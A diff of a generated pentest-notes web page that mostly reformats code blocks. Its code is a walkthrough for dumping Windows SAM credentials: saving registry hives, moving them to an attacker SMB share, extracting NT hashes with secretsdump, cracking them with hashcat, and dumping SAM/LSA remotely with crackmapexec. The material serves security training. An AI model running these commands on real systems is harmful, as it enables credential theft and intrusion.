@@ -683,6 +683,8 @@
       
         
       
+        
+      
     
     
     
@@ -765,6 +767,27 @@
   
   <span class="md-ellipsis">
     ADB
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adidnsdump/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    adidnsdump
   </span>
   
 
@@ -17137,52 +17160,72 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </tbody>
 </table>
 <p>Launching CMD as an admin will allow us to run reg.exe to save copies of the registry hives.</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>reg.exe save hklm\sam C:\sam.save
-</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>
-</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>reg.exe save hklm\system C:\system.save
-</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>
-</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>reg.exe save hklm\security C:\security.save
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-0-1">1</a></span>
+<span class="normal"><a href="#__codelineno-0-2">2</a></span>
+<span class="normal"><a href="#__codelineno-0-3">3</a></span>
+<span class="normal"><a href="#__codelineno-0-4">4</a></span>
+<span class="normal"><a href="#__codelineno-0-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1"></a>reg.exe save hklm\sam C:\sam.save
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2"></a>
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3"></a>reg.exe save hklm\system C:\system.save
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4"></a>
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5"></a>reg.exe save hklm\security C:\security.save
+</span></code></pre></div></td></tr></table></div>
 <p>Transfer the registry hives to our attacker machine, for instance, with <a href="../smbserver/">smbserver.py from impacket</a>.</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="c1"># From the attacker machine (our kali) all we must do to create the share is run smbserver.py -smb2support using python, give the share a name (CompData) and specify the direct</span>
-</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="c1">#########################################</span>
-</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>sudo<span class="w"> </span>python3<span class="w"> </span>/usr/share/doc/python3-impacket/examples/smbserver.py<span class="w"> </span>-smb2support<span class="w"> </span>CompData<span class="w"> </span>/home/ltnbob/Documents/
-</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>
-</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a><span class="c1"># From the victim&#39;s machine (windows)</span>
-</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a><span class="c1">#########################################</span>
-</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a>move<span class="w"> </span>sam.save<span class="w"> </span><span class="se">\\</span><span class="nv">$ipAttacker</span><span class="se">\C</span>ompData
-</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a>move<span class="w"> </span>system.save<span class="w"> </span><span class="se">\\</span><span class="nv">$ipAttacker</span><span class="se">\C</span>ompData
-</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a>move<span class="w"> </span>security.save<span class="w"> </span><span class="se">\\</span><span class="nv">$ipAttacker</span><span class="se">\C</span>ompData
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-1-1">1</a></span>
+<span class="normal"><a href="#__codelineno-1-2">2</a></span>
+<span class="normal"><a href="#__codelineno-1-3">3</a></span>
+<span class="normal"><a href="#__codelineno-1-4">4</a></span>
+<span class="normal"><a href="#__codelineno-1-5">5</a></span>
+<span class="normal"><a href="#__codelineno-1-6">6</a></span>
+<span class="normal"><a href="#__codelineno-1-7">7</a></span>
+<span class="normal"><a href="#__codelineno-1-8">8</a></span>
+<span class="normal"><a href="#__codelineno-1-9">9</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1"></a><span class="c1"># From the attacker machine (our kali) all we must do to create the share is run smbserver.py -smb2support using python, give the share a name (CompData) and specify the direct</span>
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2"></a><span class="c1">#########################################</span>
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3"></a>sudo<span class="w"> </span>python3<span class="w"> </span>/usr/share/doc/python3-impacket/examples/smbserver.py<span class="w"> </span>-smb2support<span class="w"> </span>CompData<span class="w"> </span>/home/ltnbob/Documents/
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4"></a>
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5"></a><span class="c1"># From the victim&#39;s machine (windows)</span>
+</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6"></a><span class="c1">#########################################</span>
+</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7"></a>move<span class="w"> </span>sam.save<span class="w"> </span><span class="se">\\</span><span class="nv">$ipAttacker</span><span class="se">\C</span>ompData
+</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8"></a>move<span class="w"> </span>system.save<span class="w"> </span><span class="se">\\</span><span class="nv">$ipAttacker</span><span class="se">\C</span>ompData
+</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9"></a>move<span class="w"> </span>security.save<span class="w"> </span><span class="se">\\</span><span class="nv">$ipAttacker</span><span class="se">\C</span>ompData
+</span></code></pre></div></td></tr></table></div>
 <h3 id="2-dumping-hashes-with-impackets-secretsdumppy">2. Dumping Hashes with Impacket's secretsdump.py</h3>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>locate<span class="w"> </span>secretsdump<span class="w"> </span>
-</span></code></pre></div>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>python3<span class="w"> </span>/usr/share/doc/python3-impacket/examples/secretsdump.py<span class="w"> </span>-sam<span class="w"> </span>sam.save<span class="w"> </span>-security<span class="w"> </span>security.save<span class="w"> </span>-system<span class="w"> </span>system.save<span class="w"> </span>LOCAL
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-2-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1"></a>locate<span class="w"> </span>secretsdump<span class="w"> </span>
+</span></code></pre></div></td></tr></table></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-3-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1"></a>python3<span class="w"> </span>/usr/share/doc/python3-impacket/examples/secretsdump.py<span class="w"> </span>-sam<span class="w"> </span>sam.save<span class="w"> </span>-security<span class="w"> </span>security.save<span class="w"> </span>-system<span class="w"> </span>system.save<span class="w"> </span>LOCAL
+</span></code></pre></div></td></tr></table></div>
 <p>Secretsdump dumps the local SAM hashes and would've 
 also dumped the cached domain logon information if the target was domain-joined and had cached credentials present in hklm\security. </p>
 <p>The first step secretsdump executes is targeting the system bootkey before proceeding to dump the LOCAL SAM hashes. It cannot dump those hashes without the boot key because that boot key is used to encrypt &amp; decrypt the SAM database.</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>(uid:rid:lmhash:nthash)
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-4-1">1</a></span>
+<span class="normal"><a href="#__codelineno-4-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1"></a>Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2"></a>(uid:rid:lmhash:nthash)
+</span></code></pre></div></td></tr></table></div>
 <p>Most modern Windows operating systems store the password as an NT hash. Operating systems older than Windows Vista &amp; Windows Server 2008 store passwords as an LM hash, so we may only benefit from cracking those if our target is an older Windows OS. Knowing this, we can copy the NT hashes associated with each user account into a text file and start cracking passwords.</p>
 <h3 id="3-cracking-hashes-with-hashcat">3. Cracking Hashes with Hashcat</h3>
 <p><a href="../hashcat/">See hashcat</a>:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="c1"># Adding nthashes to a .txt File</span>
-</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="c1"># Copy paste them in hashestocrack.txt</span>
-</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>
-</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="c1"># Hashcat them</span>
-</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a>sudo<span class="w"> </span>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">1000</span><span class="w"> </span>hashestocrack.txt<span class="w"> </span>/usr/share/wordlists/rockyou.txt
-</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a><span class="c1"># -m 1000: select module for NT hashes</span>
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-5-1">1</a></span>
+<span class="normal"><a href="#__codelineno-5-2">2</a></span>
+<span class="normal"><a href="#__codelineno-5-3">3</a></span>
+<span class="normal"><a href="#__codelineno-5-4">4</a></span>
+<span class="normal"><a href="#__codelineno-5-5">5</a></span>
+<span class="normal"><a href="#__codelineno-5-6">6</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1"></a><span class="c1"># Adding nthashes to a .txt File</span>
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2"></a><span class="c1"># Copy paste them in hashestocrack.txt</span>
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3"></a>
+</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4"></a><span class="c1"># Hashcat them</span>
+</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5"></a>sudo<span class="w"> </span>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">1000</span><span class="w"> </span>hashestocrack.txt<span class="w"> </span>/usr/share/wordlists/rockyou.txt
+</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6"></a><span class="c1"># -m 1000: select module for NT hashes</span>
+</span></code></pre></div></td></tr></table></div>
 <h2 id="dumping-sam-remotely">Dumping SAM Remotely</h2>
 <h3 id="with-crackmapexec">With CrackMapExec</h3>
 <p>With access to credentials with local admin privileges, it is also possible for us to target LSA Secrets over the network. </p>
 <p><a href="../crackmapexec/">Cheat sheet of CrackMapExec</a>.</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>crackmapexec<span class="w"> </span>smb<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>--local-auth<span class="w"> </span>-u<span class="w"> </span>&lt;username&gt;<span class="w"> </span>-p<span class="w"> </span>&lt;password&gt;<span class="w"> </span>--sam
-</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>
-</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>crackmapexec<span class="w"> </span>smb<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>--local-auth<span class="w"> </span>-u<span class="w"> </span>&lt;username&gt;<span class="w"> </span>-p<span class="w"> </span>&lt;password&gt;<span class="w"> </span>--lsa
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-6-1">1</a></span>
+<span class="normal"><a href="#__codelineno-6-2">2</a></span>
+<span class="normal"><a href="#__codelineno-6-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1"></a>crackmapexec<span class="w"> </span>smb<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>--local-auth<span class="w"> </span>-u<span class="w"> </span>&lt;username&gt;<span class="w"> </span>-p<span class="w"> </span>&lt;password&gt;<span class="w"> </span>--sam
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2"></a>
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3"></a>crackmapexec<span class="w"> </span>smb<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>--local-auth<span class="w"> </span>-u<span class="w"> </span>&lt;username&gt;<span class="w"> </span>-p<span class="w"> </span>&lt;password&gt;<span class="w"> </span>--lsa
+</span></code></pre></div></td></tr></table></div>
 
 <!-- This section adds support for localized revision dates -->
 
@@ -17258,7 +17301,7 @@ also dumped the cached domain logon information if the target was domain-joined 
     </div>
     
     
-    <script id="__config" type="application/json">{"base": "..", "features": ["navigation.instant", "navigation.top", "navigation.indexes", "navigation.path", "navigation.tab", "content.code.annotate", "content.code.copy", "content.code.select", "search.suggest", "search.highlight"], "search": "../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    <script id="__config" type="application/json">{"base": "..", "features": ["navigation.instant", "navigation.top", "navigation.indexes", "navigation.path", "navigation.tab", "content.code.annotate", "content.code.copy", "content.code.select", "search.suggest", "search.highlight", "codehilite", "code-blocks"], "search": "../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
     
     
       <script src="../assets/javascripts/bundle.88dd0f4e.min.js"></script>
